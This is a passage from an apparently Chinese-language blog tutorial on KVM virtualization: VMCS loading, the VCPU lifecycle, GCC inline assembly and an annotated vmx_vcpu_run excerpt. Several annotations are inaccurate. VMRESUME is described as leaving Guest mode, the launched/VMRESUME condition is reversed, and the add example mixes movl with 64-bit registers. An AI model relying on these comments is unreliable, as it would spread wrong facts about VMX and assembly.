这是一个内联汇编代码，用于执行VMCS的加载操作（VMPTRLD）。`ASM_VMX_VMPTRLD_RAX`是一个宏，展开后是VMX指令`VMPTRLD`，用于加载VMCS。`&quot;=g&quot;(error)`表示将错误码保存在`error`变量中，`&quot;a&quot;(&amp;phys_addr)`表示将`phys_addr`的地址传递给寄存器RAX，`&quot;m&quot;(phys_addr)`表示将`phys_addr`作为内存操作数，`&quot;cc&quot;`表示该内联汇编代码可能影响标志寄存器。</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(ASM_VMX_VMPTRLD_RAX <span class="hljs-string">&quot;; setna %0&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">                      : <span class="hljs-string">&quot;=g&quot;</span>(error) : <span class="hljs-string">&quot;a&quot;</span>(&amp;phys_addr), <span class="hljs-string">&quot;m&quot;</span>(phys_addr)</span></span><br><span class="hljs-params"><span class="hljs-function">                      : <span class="hljs-string">&quot;cc&quot;</span>)</span></span>;<br>        <br>        <span class="hljs-comment">// ... 其他代码 ...</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// ... 其他代码 ...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li>代码中的<code>vmx_vcpu_load</code>函数用于加载虚拟CPU的VMCS（虚拟机控制结构）。</li><li><code>phys_addr</code>变量存储了<code>vcpu-&gt;vmcs</code>的虚拟地址转换后的物理地址。</li><li><code>get_cpu()</code>函数用于获取当前CPU的编号。</li><li><code>per_cpu(current_vmcs, cpu)</code>是指向当前CPU上活动的VMCS的指针，检查当前活动的VMCS是否与即将加载的<code>vcpu-&gt;vmcs</code>相同。</li><li>如果当前活动的VMCS与将要加载的<code>vcpu-&gt;vmcs</code>不同，那么将设置当前活动的VMCS为<code>vcpu-&gt;vmcs</code>，表示正在加载该VMCS。</li><li><code>asm volatile (ASM_VMX_VMPTRLD_RAX &quot;; setna %0&quot; ...)</code>是一个内联汇编代码，执行VMCS的加载操作（VMPTRLD），将<code>vcpu-&gt;vmcs</code>指向的VMCS加载到CPU中。</li></ol><blockquote><p><code>per_cpu</code>是Linux内核中用于访问特定CPU本地数据的宏。它是Linux内核中用于多处理器（Multiprocessor，简称MP）和多核（Multicore）系统的一种机制。<br> 在多处理器系统中，每个CPU拥有自己的本地数据，例如线程私有数据或本地缓存。由于多个CPU之间共享内存，直接访问这些本地数据可能会导致数据的不一致性。为了解决这个问题，Linux内核提供了<code>per_cpu</code>宏，它允许开发者声明和使用CPU本地的变量，并根据当前CPU的编号来访问这些变量的正确实例。<br> <code>per_cpu</code>宏使用特殊的语法，例如<code>per_cpu(var, cpu)</code>，其中<code>var</code>是要访问的变量，<code>cpu</code>是指定的CPU编号。该宏会根据当前CPU的编号自动选择正确的实例，从而确保每个CPU都访问自己本地的变量。</p></blockquote><h3 id="1-1-4-VCPU生命周期"><a href="#1-1-4-VCPU生命周期" class="headerlink" title="1.1.4 VCPU生命周期"></a>1.1.4 VCPU生命周期</h3><p>对于每个虚拟处理器（VCPU），<strong>VMM使用一个线程来代表VCPU这个实体</strong></p><p>在Guest运转过程中，每个VCPU基本都在下图所示的状态中不断地转换：（VCPU生命周期）</p><p><img src="https://img.gls.show/img/Pasted%20image%2020230801221309.png"></p><ol><li>VCPU准备：在用户空间准备好后，<strong>VCPU所在线程向内核中的KVM模块发起ioctl请求KVM_RUN</strong>，通知内核可以切入Guest模式运行Guest。</li><li>切入Guest模式：进入内核态后，KVM模块<strong>使用虚拟化指令切入Guest模式</strong>。<strong>首次</strong>运行Guest使用<strong>VMLaunch</strong>指令，否则使用<strong>VMResume</strong>指令。<ol><li>在切换过程中，CPU的状态（<strong>Host的状态</strong>）保存到VMCS中的Host状态区域，非CPU自动保存的状态由KVM负责保存</li><li>然后，加载存储在VMCS中的Guest的状态到物理CPU，非CPU自动恢复的状态由KVM负责恢复。</li></ol></li><li>运行Guest指令：物理CPU运行Guest指令。<strong>当执行Guest指令遇到敏感指令时，CPU将从Guest模式切回到Host模式的ring 0，进入Host内核的KVM模块</strong>。在切换过程中，CPU的状态（Guest的状态）保存到VMCS中的Guest状态区域，然后加载存储在VMCS中的Host的状态到物理CPU。非CPU自动保存的状态由KVM模块负责保存。</li><li>处理虚拟机退出：KVM模块从VMCS中读取虚拟机退出原因，尝试在内核中处理。如果内核可以处理，就不必再切换到Host模式的用户态了，直接快速切回Guest。这种退出也称为轻量级虚拟机退出。</li><li>处理虚拟机退出的复杂情况：如果KVM模块不能处理虚拟机退出，VCPU将再次进行上下文切换，从Host的内核态切换到Host的用户态，由VMM的用户空间部分进行处理。VMM用户空间处理完毕后，再次发起切入Guest模式的指令。</li></ol><p>在整个虚拟机运行过程中，步骤1～5循环往复。</p><p>下面是KVM切入、切出Guest的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// commit 6aa8b732ca01c3d7a54e93f4d701b8aabbe60fb7</span><br><span class="hljs-comment">// [PATCH] kvm: userspace interface</span><br><span class="hljs-comment">// linux.git/drivers/kvm/vmx.c</span><br><br><span class="hljs-comment">// 定义vmx_vcpu_run函数，用于虚拟CPU的运行和切换</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">vmx_vcpu_run</span><span class="hljs-params">(struct kvm_vcpu *vcpu, ...)</span></span><br><span class="hljs-function"></span>&#123;<br>    u8 fail;<br>    u16 fs_sel, gs_sel, ldt_sel;<br>    <span class="hljs-keyword">int</span> fs_gs_ldt_reload_needed;<br>again:<br>    <span class="hljs-comment">// ... 其他代码 ...</span><br>    <br>    <span class="hljs-comment">// 进入Guest模式</span><br>    <span class="hljs-string">&quot;jne launched \n\t&quot;</span> <span class="hljs-comment">// 检查前一个指令是否失败，如果失败则跳转到launched标签，执行VMLAUNCH指令</span><br>    ASM_VMX_VMLAUNCH <span class="hljs-string">&quot;\n\t&quot;</span> <span class="hljs-comment">// VMLAUNCH指令，用于切入Guest模式</span><br>    <span class="hljs-string">&quot;jmp kvm_vmx_return \n\t&quot;</span> <span class="hljs-comment">// 跳转到kvm_vmx_return标签，继续执行后续代码</span><br><span class="hljs-string">&quot;launched: &quot;</span> ASM_VMX_VMRESUME <span class="hljs-string">&quot;\n\t&quot;</span> <span class="hljs-comment">// VMRESUME指令，用于切出Guest模式</span><br><span class="hljs-string">&quot;.globl kvm_vmx_return \n\t&quot;</span> <span class="hljs-comment">// 声明kvm_vmx_return标签为全局标签</span><br><span class="hljs-string">&quot;kvm_vmx_return: &quot;</span> <span class="hljs-comment">// kvm_vmx_return标签，用于在需要时从其他代码段跳转到该标签处</span><br>    <span class="hljs-comment">// ... 其他代码 ...</span><br>    <br>    <span class="hljs-comment">// 处理虚拟机退出</span><br>    <span class="hljs-keyword">if</span> (kvm_handle_exit(kvm_run, vcpu)) &#123;<br>        <span class="hljs-comment">// 如果虚拟机退出原因在【内核中】得到处理，则跳转到again标签，再次进入Guest模式运行</span><br>        <span class="hljs-keyword">goto</span> again;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 函数结束，返回0表示虚拟机运行正常</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在从Guest模式退出时，KVM模块首先调用函数<code>kvm_handle_exit</code>尝试在内核空间处理虚拟机的退出原因。该函数有一个约定：如果<strong>在内核空间</strong>成功处理虚拟机退出，或者是因为其他干扰（比如外部中断）导致虚拟机退出等无需切换到Host的用户空间，则返回1；否则返回0，表示需要求助KVM的用户空间处理虚拟机退出，例如需要KVM用户空间的模拟设备来处理外设请求。</p><ul><li><p>如果内核空间成功处理了虚拟机的退出（<code>kvm_handle_exit</code>返回1），在上述代码中即直接跳转到标签<code>again</code>处，然后程序流程会再次切入Guest模式，继续执行Guest的指令。</p></li><li><p>如果函数<code>kvm_handle_exit</code>返回0，则函数<code>vmx_vcpu_run</code>结束执行，CPU从内核空间返回到用户空间。在用户空间，例如使用<code>kvmtool</code>作为例子，会处理Guest的请求，比如调用模拟设备来处理I/O请求。处理完Guest的请求后，程序重新进入下一轮for循环，<code>kvmtool</code>再次请求KVM模块切入Guest模式，继续执行Guest的指令。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">8</span>d20223edc81c6b199842b36fcd5b0aa1b8d3456<br>Dump KVM_EXIT_IO details<br>kvmtool.git/kvm.<span class="hljs-function">c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>…<br><span class="hljs-keyword">for</span> (;;) &#123;<br>kvm__run(kvm);<br><span class="hljs-keyword">switch</span> (kvm-&gt;kvm_run-&gt;exit_reason) &#123;<br><span class="hljs-keyword">case</span> KVM_EXIT_IO:<br>…<br>&#125;<br>…<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2虚拟机切入和退出"><a href="#1-2虚拟机切入和退出" class="headerlink" title="1.2虚拟机切入和退出"></a>1.2虚拟机切入和退出</h2><h3 id="1-2-1GCC内联汇编"><a href="#1-2-1GCC内联汇编" class="headerlink" title="1.2.1GCC内联汇编"></a>1.2.1GCC内联汇编</h3><blockquote><p>KVM模块中切入Guest模式的代码使用GCC的内联汇编编写</p></blockquote><p>内联汇编基本语法模板如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">( assembler <span class="hljs-keyword">template</span></span></span><br><span class="hljs-params"><span class="hljs-function">    : output operands <span class="hljs-comment">/* optional */</span></span></span><br><span class="hljs-params"><span class="hljs-function">    : input operands <span class="hljs-comment">/* optional */</span></span></span><br><span class="hljs-params"><span class="hljs-function">    : <span class="hljs-built_in">list</span> of clobbered registers <span class="hljs-comment">/* optional */</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>asm为GCC关键字，表示接下来要嵌入汇编代码</li><li>volatile为可选关键字，表示不需要GCC对下面的汇编代码做任何优化</li><li>assembler template是要嵌入的汇编指令，如果内嵌多行汇编指令，则每条指令占用1行，每行指令使用双引号括起来，以后缀<code>\n\t</code>结尾</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">__asm_<span class="hljs-number">_</span> (<span class="hljs-string">&quot;movl %eax, %ebx \n\t&quot;</span><br>    <span class="hljs-string">&quot;movl $56, %esi \n\t&quot;</span><br>    <span class="hljs-string">&quot;movl %ecx, $label(%edx,%ebx,$4) \n\t&quot;</span><br>    <span class="hljs-string">&quot;movb %ah, (%ebx) \n\t&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>当使用扩展模式，即包含output、input和clobber list部分时，汇编指令中需要使用两个“%”来引用寄存器，比如%%rax；使用一个“%”来引用输入、输出操作数，比如%1，以便帮助GCC区分寄存器和由C语言提供的操作数</p></blockquote><ul><li><p><strong>输出操作数（output operands）</strong>。输出操作数，用来指示内联汇编指令修改了C代码中的变量。如果有多个输出参数，则需要对每个输出参数进行分隔。</p><ul><li>输出操作数的格式可以为<code>[[asmSymbolicName]] constraint (cvariablename)</code>，可以为输出操作数指定一个名字asmSymbolicName，汇编指令中可以使用这个名字引用输出操作数。约束部分必须以“=”或者“+”作为前缀，“=”表示只写，“+”表示读写。在前缀之后，就可以是各种约束了，比如“=a”表示先将结果输出至rax/eax寄存器，然后再由rax/eax寄存器更新相应的输出变量。cvariablename为代码中的C变量名字，需要使用括号括起来</li><li>也可以使用序号引用操作数比如输出操作数有两个，那么可以用**%0引用第1个输出操作数，%1引用第2个操作数**，以此类推。</li></ul></li><li><p><strong>输入操作数（input operands）</strong>。与输出操作数相似。输入操作数来自C代码中的变量或者表达式。</p><ul><li>除了不必以“=”或者“+”前缀开头外，输入操作数的前缀与输出操作数基本相同。</li><li>输出操作数的格式可以为<code>[[asmSymbolicName]] constraint (cvariablename)</code></li><li>除了寄存器约束外，“i”这个约束，表示这个输入操作数是个立即数（immediateinteger）</li><li>输出操作数的格式也可以从最后一个输出操作数的序号加1开始，比如输出操作数有两个，输入操作数有3个，那么需要使用%2引用第1个输入操作数，%3引用第2个输入操作数，以此类推。</li></ul></li><li><p><strong>clobber list</strong></p><ul><li>汇编指令执行后<strong>可能会隐性地影响某些寄存器或者内存的值</strong>，如果被影响的寄存器或者内存并没有在输入、输出操作数中列出来，那么需要将这些寄存器或者内存列入clobber list。通过这种方式，内联汇编告知GCC，在执行内联汇编指令后恢复寄存器的值</li></ul></li></ul><p>一个具体的例子：一个加法运算，一个加数是val，值为100，另外一个加数是一个立即数400，计算结果保存到变量sum中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">01</span> <span class="hljs-keyword">int</span> val = <span class="hljs-number">100</span>, sum = <span class="hljs-number">0</span>;<br><br><span class="hljs-number">03</span> <span class="hljs-comment">// 使用内联汇编将 val + 400 的结果存储到 sum 变量中</span><br><span class="hljs-number">04</span> <span class="hljs-keyword">asm</span> (<span class="hljs-string">&quot;movl %1, %%rax; \n\t&quot;</span>  <span class="hljs-comment">// 将 val 的值加载到寄存器 rax</span><br><span class="hljs-number">05</span>      <span class="hljs-string">&quot;movl %c[addend], %%rbx; \n\t&quot;</span>  <span class="hljs-comment">// 将常量 400 加载到寄存器 rbx</span><br><span class="hljs-number">06</span>      <span class="hljs-string">&quot;addl %%rbx, %%rax; \n\t&quot;</span>  <span class="hljs-comment">// 将 rax 和 rbx 寄存器的值相加，结果保存在 rax</span><br><span class="hljs-number">07</span>      <span class="hljs-string">&quot;movl %%rax, %0; \n\t&quot;</span>  <span class="hljs-comment">// 将 rax 寄存器的值存回 sum 变量</span><br><span class="hljs-number">08</span>     <br><span class="hljs-number">09</span>      : <span class="hljs-string">&quot;=r&quot;</span> (sum)  <span class="hljs-comment">// 输出约束：将 rax 寄存器的值存储到 sum 变量中</span><br><span class="hljs-number">10</span>      : <span class="hljs-string">&quot;r&quot;</span> (val), [addend] <span class="hljs-string">&quot;i&quot;</span> (<span class="hljs-number">400</span>)  <span class="hljs-comment">// 输入约束：val 是变量输入，[addend] 表示常量 400</span><br><span class="hljs-number">11</span>      : <span class="hljs-string">&quot;rbx&quot;</span>  <span class="hljs-comment">// clobber约束：表示寄存器 rbx 在内联汇编代码中被使用</span><br><span class="hljs-number">12</span> );<br><br></code></pre></td></tr></table></figure><p>在汇编代码中使用了rbx寄存器，而rbx 寄存器没有出现在输出、输入操作数中，所以内联汇编需要把rbx寄存 器列入clobber list中，见第10行代码，告诉GCC汇编指令污染了rbx 寄存器</p><h3 id="1-2-2虚拟机切入和退出及相关的上下文保存"><a href="#1-2-2虚拟机切入和退出及相关的上下文保存" class="headerlink" title="1.2.2虚拟机切入和退出及相关的上下文保存"></a>1.2.2虚拟机切入和退出及相关的上下文保存</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">01</span> <span class="hljs-comment">/* 提交哈希和代码文件路径 */</span><br><span class="hljs-number">02</span> <span class="hljs-comment">/* 提交 1c696d0e1b7c10e1e8b34cb6c797329e3c33f262 */</span><br><span class="hljs-number">03</span> <span class="hljs-comment">/* linux.git/arch/x86/kvm/vmx.c */</span><br><span class="hljs-number">04</span> <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vmx_vcpu_run</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function">05 </span>&#123;<br><span class="hljs-number">06</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu_vmx</span> *<span class="hljs-title">vmx</span> =</span> to_vmx(vcpu);<br><span class="hljs-number">07</span>     <span class="hljs-keyword">asm</span>(<br><span class="hljs-number">08</span>         <span class="hljs-comment">/* 保存宿主机寄存器 */</span><br><span class="hljs-number">09</span>         <span class="hljs-string">&quot;push %%&quot;</span>R<span class="hljs-string">&quot;dx; push %%&quot;</span>R<span class="hljs-string">&quot;bp;&quot;</span><br><span class="hljs-number">10</span>         <span class="hljs-string">&quot;push %%&quot;</span>R<span class="hljs-string">&quot;cx \n\t&quot;</span><br><span class="hljs-number">11</span>         <span class="hljs-string">&quot;cmp %%&quot;</span>R<span class="hljs-string">&quot;sp, %c[host_rsp](%0) \n\t&quot;</span>; <span class="hljs-comment">/* 比较当前栈指针与host_rsp (vmx-&gt;host_rsp) */</span><br><span class="hljs-number">12</span>         <span class="hljs-string">&quot;je 1f \n\t&quot;</span>; <span class="hljs-comment">/* 如果相等 (未改变栈), 跳转到标签 1 */</span><br><span class="hljs-number">13</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;sp, %c[host_rsp](%0) \n\t&quot;</span>; <span class="hljs-comment">/* 如果不相等 (栈改变), 更新host_rsp为当前栈指针 */</span><br><span class="hljs-number">14</span>         __ex(ASM_VMX_VMWRITE_RSP_RDX) <span class="hljs-string">&quot;\n\t&quot;</span>; <span class="hljs-comment">/* 将当前栈指针 (RDX) 保存到guest状态 */</span><br><br><span class="hljs-number">15</span>         <span class="hljs-string">&quot;1: \n\t&quot;</span>; <span class="hljs-comment">/* 标签 1: 如果cr2寄存器值有改变, 重新加载它 */</span><br><span class="hljs-number">16</span>         <span class="hljs-string">&quot;mov %c[cr2](%0), %%&quot;</span>R<span class="hljs-string">&quot;ax \n\t&quot;</span>; <span class="hljs-comment">/* 将保存在vmx-&gt;cr2中的cr2寄存器值加载到RAX */</span><br><span class="hljs-number">17</span>         <span class="hljs-string">&quot;mov %%cr2, %%&quot;</span>R<span class="hljs-string">&quot;dx \n\t&quot;</span>; <span class="hljs-comment">/* 将当前的cr2寄存器值加载到RDX */</span><br><span class="hljs-number">18</span>         <span class="hljs-string">&quot;cmp %%&quot;</span>R<span class="hljs-string">&quot;ax, %%&quot;</span>R<span class="hljs-string">&quot;dx \n\t&quot;</span>; <span class="hljs-comment">/* 比较保存的值与当前cr2寄存器值 */</span><br><span class="hljs-number">19</span>         <span class="hljs-string">&quot;je 2f \n\t&quot;</span>; <span class="hljs-comment">/* 如果相等 (未改变cr2), 跳转到标签 2 */</span><br><span class="hljs-number">20</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;ax, %%cr2 \n\t&quot;</span>; <span class="hljs-comment">/* 如果不相等 (cr2有改变), 重新加载cr2为保存的值 */</span><br><span class="hljs-number">21</span>         <span class="hljs-string">&quot;2: \n\t&quot;</span>; <span class="hljs-comment">/* 标签 2 */</span><br><br><span class="hljs-number">22</span>         <span class="hljs-comment">/* 检查是否需要vmlaunch或vmresume */</span><br><span class="hljs-number">23</span>         <span class="hljs-string">&quot;cmpl $0, %c[launched](%0) \n\t&quot;</span>; <span class="hljs-comment">/* 检查vmx-&gt;launched的值 */</span><br><span class="hljs-number">24</span>         <span class="hljs-comment">/* 加载客户机寄存器，不破坏标志位 */</span><br><span class="hljs-number">25</span>         <span class="hljs-string">&quot;mov %c[rax](%0), %%&quot;</span>R<span class="hljs-string">&quot;ax \n\t&quot;</span>; <span class="hljs-comment">/* 将vcpu.arch.regs[VCPU_REGS_RAX]的值加载到RAX */</span><br><span class="hljs-number">26</span>         <span class="hljs-string">&quot;mov %c[rbx](%0), %%&quot;</span>R<span class="hljs-string">&quot;bx \n\t&quot;</span>; <span class="hljs-comment">/* 将vcpu.arch.regs[VCPU_REGS_RBX]的值加载到RBX */</span><br><span class="hljs-number">27</span>         <span class="hljs-comment">/* ... 其他客户机寄存器加载 ... */</span><br><span class="hljs-number">28</span>         <span class="hljs-string">&quot;mov %c[rcx](%0), %%&quot;</span>R<span class="hljs-string">&quot;cx \n\t&quot;</span>; <span class="hljs-comment">/* 将vcpu.arch.regs[VCPU_REGS_RCX]的值加载到RCX (破坏之前RCX的值) */</span><br><br><span class="hljs-number">29</span>         <span class="hljs-comment">/* 进入客户机模式 */</span><br><span class="hljs-number">30</span>         <span class="hljs-string">&quot;jne .Llaunched \n\t&quot;</span>; <span class="hljs-comment">/* 如果vmx-&gt;launched != 0，跳转到标签 .Llaunched */</span><br><span class="hljs-number">31</span>         __ex(ASM_VMX_VMLAUNCH) <span class="hljs-string">&quot;\n\t&quot;</span>; <span class="hljs-comment">/* 否则，使用VMLAUNCH执行VM entry */</span><br><span class="hljs-number">32</span>         <span class="hljs-string">&quot;jmp .Lkvm_vmx_return \n\t&quot;</span>; <span class="hljs-comment">/* 跳转到标签 .Lkvm_vmx_return 继续 */</span><br><br><span class="hljs-number">33</span>         <span class="hljs-string">&quot;.Llaunched: &quot;</span> __ex(ASM_VMX_VMRESUME) <span class="hljs-string">&quot;\n\t&quot;</span>; <span class="hljs-comment">/* 如果vmx-&gt;launched == 0，使用VMRESUME执行VM entry */</span><br><br><span class="hljs-number">34</span>         <span class="hljs-string">&quot;.Lkvm_vmx_return: &quot;</span> <span class="hljs-comment">/* 标签 .Lkvm_vmx_return */</span><br><br><span class="hljs-number">35</span>         <span class="hljs-comment">/* 保存客户机寄存器，加载宿主机寄存器，保持... */</span><br><span class="hljs-number">36</span>         <span class="hljs-string">&quot;xchg %0, (%%&quot;</span>R<span class="hljs-string">&quot;sp) \n\t&quot;</span>; <span class="hljs-comment">/* 交换vmx指针与栈顶的值 (vmx-&gt;host_rsp) */</span><br><span class="hljs-number">37</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;ax, %c[rax](%0) \n\t&quot;</span>; <span class="hljs-comment">/* 将RAX的值存储到vcpu.arch.regs[VCPU_REGS_RAX] */</span><br><span class="hljs-number">38</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;bx, %c[rbx](%0) \n\t&quot;</span>; <span class="hljs-comment">/* 将RBX的值存储到vcpu.arch.regs[VCPU_REGS_RBX] */</span><br><span class="hljs-number">39</span>         <span class="hljs-string">&quot;pop&quot;</span>Q<span class="hljs-string">&quot; %c[rcx](%0) \n\t&quot;</span>; <span class="hljs-comment">/* 将栈顶的值 (vmx-&gt;host_rsp) 弹出到RCX */</span><br><span class="hljs-number">40</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;dx, %c[rdx](%0) \n\t&quot;</span>; <span class="hljs-comment">/* 将RDX的值存储到vcpu.arch.regs[VCPU_REGS_RDX] */</span><br><span class="hljs-number">41</span>         <span class="hljs-comment">/* ... 其他客户机寄存器存储 ... */</span><br><span class="hljs-number">42</span>         <span class="hljs-string">&quot;mov %%cr2, %%&quot;</span>R<span class="hljs-string">&quot;ax \n\t&quot;</span>; <span class="hljs-comment">/* 将当前的cr2值加载到RAX */</span><br><span class="hljs-number">43</span>         <span class="hljs-string">&quot;mov %%&quot;</span>R<span class="hljs-string">&quot;ax, %c[cr2](%0) \n\t&quot;</span>; <span class="hljs-comment">/* 将RAX的值存储到vmx-&gt;cr2 */</span><br><br><span class="hljs-number">44</span>         <span class="hljs-string">&quot;pop %%&quot;</span>R<span class="hljs-string">&quot;bp; pop %%&quot;</span>R<span class="hljs-string">&quot;dx \n\t&quot;</span>; <span class="hljs-comment">/* 弹出栈中的RBP和RDX的值 */</span><br><span class="hljs-number">45</span>         <span class="hljs-string">&quot;setbe %c[fail](%0) \n\t&quot;</span>; <span class="hljs-comment">/* 如果进位标志位设置 (发生任何错误), 设置vmx-&gt;fail标志 */</span><br><span class="hljs-number">46</span>         : : <span class="hljs-string">&quot;c&quot;</span>(vmx), <span class="hljs-string">&quot;d&quot;</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)HOST_RSP),<br><span class="hljs-number">47</span>         [launched]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, launched)),<br><span class="hljs-number">48</span>         [fail]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, fail)),<br><span class="hljs-number">49</span>         [host_rsp]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, host_rsp)),<br><span class="hljs-number">50</span>         [rax]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.regs[VCPU_REGS_RAX])),<br><span class="hljs-number">51</span>         [rbx]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.regs[VCPU_REGS_RBX])),<br><span class="hljs-number">52</span>         <span class="hljs-comment">/* ... 其他客户机寄存器的偏移量 ... */</span><br><span class="hljs-number">53</span>         [rcx]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.regs[VCPU_REGS_RCX])),<br><span class="hljs-number">54</span>         [rdx]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.regs[VCPU_REGS_RDX])),<br><span class="hljs-number">55</span>         <span class="hljs-comment">/* ... 其他客户机寄存器的偏移量 ... */</span><br><span class="hljs-number">56</span>         [cr2]<span class="hljs-string">&quot;i&quot;</span>(offsetof(struct vcpu_vmx, vcpu.arch.cr2))<br><span class="hljs-number">57</span>         : <span class="hljs-string">&quot;cc&quot;</span>, <span class="hljs-string">&quot;memory&quot;</span><br><span class="hljs-number">58</span>         , R<span class="hljs-string">&quot;ax&quot;</span>, R<span class="hljs-string">&quot;bx&quot;</span>, R<span class="hljs-string">&quot;di&quot;</span>, R<span class="hljs-string">&quot;si&quot;</span><br><span class="hljs-number">59</span>         <span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_X86_64</span><br><span class="hljs-number">60</span>         , <span class="hljs-string">&quot;r8&quot;</span>, <span class="hljs-string">&quot;r9&quot;</span>, <span class="hljs-string">&quot;r10&quot;</span>, <span class="hljs-string">&quot;r11&quot;</span>, <span class="hljs-string">&quot;r12&quot;</span>, <span class="hljs-string">&quot;r13&quot;</span>, <span class="hljs-string">&quot;r14&quot;</span>, <span class="hljs-string">&quot;r15&quot;</span> <span class="hljs-comment">/* 在x86_64架构上，还包含其他寄存器的约束 */</span><br><span class="hljs-number">61</span>         <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-number">62</span>     );<br><span class="hljs-number">63</span>     <span class="hljs-comment">/* ... 其他代码 ... */</span><br><span class="hljs-number">64</span> 